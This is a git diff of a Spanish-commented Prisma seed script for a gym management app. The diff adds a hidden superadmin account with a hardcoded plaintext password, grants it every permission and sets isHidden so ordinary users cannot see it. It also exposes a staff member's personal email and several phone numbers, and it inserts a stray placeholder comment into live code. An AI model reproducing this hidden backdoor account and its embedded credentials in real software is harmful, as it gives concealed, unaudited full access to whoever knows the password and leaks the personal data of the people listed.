@@ -118,9 +118,52 @@ async function main() {
   }
   console.log(`   ✅ ${SYSTEM_PERMISSIONS.length} permisos creados/actualizados\n`);
 
-  // 2. Crear o actualizar usuario administrador inicial (Verónica)
+  // 2. Crear o actualizar usuario superadministrador oculto
+  console.log('👤 Creando/actualizando usuario superadministrador oculto...');
+  const superAdminEmail = 'superadmin@arcagym.com';
+  // En producción, cambia esta contraseña inmediatamente o usa una variable de entorno
+  const superAdminPassword = await bcrypt.hash('ArcaGymSuperAdmin2026!', 10);
+  const superAdmin = await prisma.user.upsert({
+    where: { email: superAdminEmail },
+    update: {
+      password: superAdminPassword,
+      firstName: 'Super',
+      lastName: 'Admin',
+      dni: '0',
+      phone: '0',
+      role: 'ADMIN',
+      isActive: true,
+      isHidden: true,
+    },
+    create: {
+      email: superAdminEmail,
+      password: superAdminPassword,
+      firstName: 'Super',
+      lastName: 'Admin',
+      dni: '0',
+      phone: '0',
+      role: 'ADMIN',
+      isActive: true,
+      isHidden: true,
+    },
+  });
+  // Asignar todos los permisos al superadmin
+  await prisma.userPermission.deleteMany({ where: { userId: superAdmin.id } });
+  const allPermissions = await prisma.permission.findMany();
+  for (const perm of allPermissions) {
+    await prisma.userPermission.create({
+      data: {
+        userId: superAdmin.id,
+        permissionId: perm.id,
+        granted: true,
+      },
+    });
+  }
+  console.log(`   ✅ Superadministrador actualizado (OCULTO): ${superAdmin.email}\n`);
+
+  // 3. Crear o actualizar usuario administrador inicial (Verónica)
   console.log('👤 Creando/actualizando usuario administrador...');
-  const adminEmail = '***REMOVED***';
+  const adminEmail = 'veronicarequena2@gmail.com';
   const adminPassword = await bcrypt.hash('***REMOVED***', 10);
   const admin = await prisma.user.upsert({
     where: { email: adminEmail },
@@ -132,6 +175,7 @@ async function main() {
       phone: '11240209461',
       role: 'ADMIN',
       isActive: true,
+      isHidden: false,
     },
     create: {
       email: adminEmail,
@@ -142,11 +186,12 @@ async function main() {
       phone: '11240209461',
       role: 'ADMIN',
       isActive: true,
+      isHidden: false,
     },
   });
+  // ... resta del código ...
   // Asignar todos los permisos al admin (eliminar y volver a crear para evitar duplicados)
   await prisma.userPermission.deleteMany({ where: { userId: admin.id } });
-  const allPermissions = await prisma.permission.findMany();
   for (const perm of allPermissions) {
     await prisma.userPermission.create({
       data: {
@@ -175,6 +220,7 @@ async function main() {
       phone: '1139244649',
       role: 'TRAINER',
       isActive: true,
+      isHidden: false,
     },
     create: {
       email: trainerEmail,
@@ -185,6 +231,7 @@ async function main() {
       phone: '1139244649',
       role: 'TRAINER',
       isActive: true,
+      isHidden: false,
     },
   });
   // Asignar permisos por defecto de TRAINER (eliminar y volver a crear para evitar duplicados)
@@ -220,6 +267,7 @@ async function main() {
       phone: '1123474373',
       role: 'TRAINER',
       isActive: true,
+      isHidden: false,
     },
     create: {
       email: profeEmail,
@@ -230,6 +278,7 @@ async function main() {
       phone: '1123474373',
       role: 'TRAINER',
       isActive: true,
+      isHidden: false,
     },
   });
   // Asignar permisos por defecto de TRAINER (eliminar y volver a crear para evitar duplicados)
